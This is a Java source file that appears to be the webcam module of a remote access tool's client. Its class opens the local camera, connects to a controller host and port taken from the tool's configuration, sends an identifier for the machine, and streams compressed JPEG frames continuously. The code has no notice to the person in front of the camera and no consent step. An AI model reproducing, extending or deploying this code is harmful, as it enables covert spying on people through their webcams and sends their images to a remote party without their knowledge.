package rt.modulos.cam;

import comunes.WebCamInterface;
import java.awt.Dimension;
import java.awt.image.BufferedImage;
import network.Conexion;
import rt.Inicio;
import comunes.Interfaz;
import rt.util.IMG;
import rt.util.Protocolo;
import rt.util.UtilRT;

//captura webcam
public class CWC extends Thread implements Interfaz {

    private Interfaz servicio;
    public boolean activo;
    private float calidad = 100;
    private WebCamInterface webC;
    private String nombreCam;
    private boolean abierto;
    private long hashAnterior;

    public CWC() {
    }

    @Override
    public void instanciar(Object... parametros) {
        this.servicio = (Interfaz) parametros[0];
        activo = true;
        abierto = false;
        try {
            webC = ((WebCamInterface) Class.forName("comunes.ObtenerWebCam").newInstance());
        } catch (Exception ex) {
            servicio.ejecutar(3, Protocolo.NO_WEB_CAM);
        }
    }

    private void abrir() {
        try {
            webC.abrir();
            abierto = true;
        } catch (Exception e) {
            servicio.ejecutar(6, "ERROR AL ABRIR " + nombreCam + " = " + e.getMessage());
        }
    }

    private void seleccionar(String webcam) {
        webC.seleccionar(webcam);
        this.nombreCam = webcam;
    }

    private void seleccionarDimesion(String size) {
        try {
            String[] d = size.split("x");
            Dimension dim = new Dimension(Integer.valueOf(d[0]), Integer.valueOf(d[1]));
            webC.seleccionarDimension(dim);
        } catch (Exception e) {

        }
    }

    private void detener() {
        try {
            abierto = false;
            activo = false;
            webC.cerrar();
        } catch (Exception e) {
        }
    }

    private void setCalidad(float calidad) {
        this.calidad = calidad / 100;
    }

    private byte[] getImagen() {
        try {
            //return UtilRT.comprimirGZIP(IMG.saveImageJPGByte(webC.getImagen(), calidad));
            return IMG.saveImageJPGByte(webC.getImagen(), calidad);
        } catch (Exception ex) {
            return null;
        }
    }

    @Override
    public void run() {
//        setName("hilo-CAM");
        Conexion conexion = null;
        byte[] data = null;
        try {
            if (abierto) {
                conexion = new Conexion((String) servicio.get(2), (Integer) servicio.get(4), (Integer) Inicio.config.obtenerParametro("protocolo"), (Boolean) Inicio.config.obtenerParametro("ssl"));
                conexion.escribirInt(Protocolo.CAPTURA_WEB_CAM);
                conexion.flush();
                conexion.escribirObjeto(UtilRT.texto(Inicio.i));
                conexion.flush();
                BufferedImage imagen = null;
                long tmp2 = 0;
                while (activo) {
                    imagen = webC.getImagen();
                    if (imagen != null) {
                        // imagen = IMG.filtrar(IMG.escalar(imagen, tipoEscalado, escala, suavizado, this.getAncho(), this.getAlto()), tipoColor);
                        data = IMG.saveImageJPGByte(imagen, calidad);
                        //tmp2 = imagen.hashCode();
                        tmp2 = UtilRT.generarChecksum(data);
                        if (hashAnterior != tmp2) {
                            conexion.escribirObjeto(UtilRT.comprimirGZIP(data));
                            conexion.flush();
                            hashAnterior = tmp2;
                        }
                    }
                    dormir();
                }
            }
        } catch (Exception ex) {
            servicio.ejecutar(6, "Web cam error: " + nombreCam + " = " + ex.getMessage());
        } finally {
            activo = false;
            try {
                if (conexion != null) {
                    conexion.cerrar();
                }
            } catch (Exception ex) {
            }
        }
    }

//    private boolean estaDetenido() {
//        return isInterrupted();
//    }
    private void iniciar() {
        activo = true;
        start();
    }

    private void dormir() {
        try {
            Thread.sleep(20);// disminuye el uso de cpu,
        } catch (Exception ie) {
        }
    }

    public void set(int opcion, Object valor) {
        try {
            switch (opcion) {
                case 1: //seleccionar
                    seleccionar((String) valor);
                    break;
                case 2: //calidad
                    setCalidad((Float) valor);
                    break;
                case 5: //seleccionar dimesion
                    seleccionarDimesion((String) valor);
                    break;
            }
        } catch (Exception e) {
        }
    }

    public Object get(int opcion, Object... parametros) {
        switch (opcion) {
            case 0: //getImagen
                return getImagen();
        }
        return null;
    }

    public void ejecutar(int opcion, Object... parametros) {
        switch (opcion) {
            case 0:
                iniciar();
                break;
            case 1:
                detener();
                break;
            case 2:
                abrir();
                break;
        }
    }
}
